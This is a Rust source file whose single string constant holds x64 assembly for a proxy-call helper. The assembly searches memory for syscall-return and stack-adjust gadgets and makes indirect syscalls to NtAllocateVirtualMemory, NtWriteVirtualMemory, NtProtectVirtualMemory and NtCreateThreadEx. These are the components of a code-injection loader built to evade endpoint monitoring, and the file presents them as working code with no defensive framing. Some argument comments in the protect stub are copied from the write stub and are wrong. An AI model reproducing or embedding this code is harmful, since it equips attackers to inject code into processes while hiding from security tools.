pub const PROXYHELPER_ASM: &str = r#"
section .data

syscall_ret dq 0000000000000000h
add_rsp_ret dq 0000000000000000h

GLOBAL CBNtAllocateVirtualMemory
GLOBAL CBNtWriteVirtualMemory
GLOBAL CBNtProtectVirtualMemory
GLOBAL CBNtCreateThreadEx
GLOBAL Search_For_Syscall_Ret
GLOBAL Search_For_Add_Rsp_Ret

SECTION .text

Search_For_Syscall_Ret:
    mov rdx, rax
    add rdx, 1
    xor rbx, rbx
    xor rcx, rcx
    mov rcx, 00FFFFFF0000000000h
    mov rdi, [rdx]
    and rdi, rcx
    or rbx, rdi
    shr rbx, 28h
    cmp rbx, 1F0FC3h
    jne Search_For_Syscall_Ret + 3h
    mov r15, syscall_ret
    mov [r15], rdx
    xor r15, r15
    ret

Search_For_Add_Rsp_Ret:
    mov rdx, rax
    add rdx, 1
    xor rbx, rbx
    xor rcx, rcx
    mov rcx, 0000FFFFFFFFFFh
    mov rdi, [rdx]
    and rdi, rcx
    or rbx, rdi
    mov r14, 00C378C48348h
    cmp rbx, r14
    jne Search_For_Add_Rsp_Ret + 3h
    mov r15, add_rsp_ret
    mov [r15], rdx
    ret

CBNtAllocateVirtualMemory:
    sub rsp, 0x78
    mov r15, add_rsp_ret
    mov r15, [r15]
    push r15
    mov rbx, rdx                
    mov rcx, [rbx]              
    mov rdx, [rbx + 0x8]        
    mov r8, [rbx + 0x10]        
    mov r9, [rbx + 0x18]        
    mov r10, [rbx + 0x24]       
    mov [rsp+0x30], r10         
    mov r10, [rbx + 0x20]       
    mov [rsp+0x28], r10         
    mov r10, rcx
    mov r15, syscall_ret
    mov r15, [r15]
    mov rax, [rbx + 0x28]
    jmp r15

CBNtWriteVirtualMemory:
    sub rsp, 0x78
    mov r15, add_rsp_ret
    mov r15, [r15]
    push r15
    mov rbx, rdx                ; backing up the struct as we are going to stomp rdx
    mov rcx, [rbx]              ; HANDLE ProcessHandle
    mov rdx, [rbx + 0x8]        ; PVOID *address
    mov r8, [rbx + 0x10]        ; PVOID *buffer
    mov r9, [rbx + 0x18]        ; ULONG BytesToWrite
    mov r10, [rbx + 0x20]       ; ULONG BytesWriten
    mov [rsp+0x28], r10         ; stack pointer for 5th arg
    mov r10, rcx
    mov r15, syscall_ret
    mov r15, [r15]
    mov rax, [rbx + 0x28]
    jmp r15

CBNtProtectVirtualMemory:
    sub rsp, 0x78
    mov r15, add_rsp_ret
    mov r15, [r15]
    push r15
    mov rbx, rdx                ; backing up the struct as we are going to stomp rdx
    mov rcx, [rbx]              ; HANDLE ProcessHandle
    mov rdx, [rbx + 0x8]        ; PVOID *address
    mov r8, [rbx + 0x10]        ; PVOID *buffer
    mov r9, [rbx + 0x18]        ; ULONG BytesToWrite
    mov r10, [rbx + 0x20]       ; ULONG BytesWriten
    mov [rsp+0x28], r10         ; stack pointer for 5th arg
    mov r10, rcx
    mov r15, syscall_ret
    mov r15, [r15]
    mov rax, [rbx + 0x28]
    jmp r15

CBNtCreateThreadEx:
    sub rsp, 0x78
    mov r15, add_rsp_ret
    mov r15, [r15]
    push r15
    mov rbx, rdx                ; backing up the struct as we are going to stomp rdx
    mov rcx, [rbx]              ; PHANDLE threadH
    mov rdx, [rbx + 0x8]        ; ACCESS_MASK desiredAcess
    mov r8, [rbx + 0x10]        ; PVOID objAttributes
    mov r9, [rbx + 0x18]        ; HANDLE pHandle
    mov r10, [rbx + 0x50]       ; PVOID lpBytesBuffer
    mov [rsp+0x58], r10         ; stack pointer for 11th arg
    mov r10, [rbx + 0x48]       ; SIZE_T sizeOfStackReserve
    mov [rsp+0x50], r10         ; stack pointer for 10th arg
    mov r10, [rbx + 0x40]       ; SIZE_T sizeOfStackCommit
    mov [rsp+0x48], r10         ; stack pointer for 9th arg
    mov r10, [rbx + 0x38]       ; SIZE_T stackZeroBits
    mov [rsp+0x40], r10         ; stack pointer for 8th arg
    mov r10, [rbx + 0x30]       ; ULONG flags
    mov [rsp+0x38], r10         ; stack pointer for 7th arg
    mov r10, [rbx + 0x28]       ; PVOID lpParameter
    mov [rsp+0x30], r10         ; stack pointer for 6th arg
    mov r10, [rbx + 0x20]       ; PVOID lpStartAddress
    mov [rsp+0x28], r10         ; stack pointer for 5th arg
    mov r10, rcx
    mov r15, syscall_ret
    mov r15, [r15]
    mov rax, [rbx + 0x58]
    jmp r15

"#;
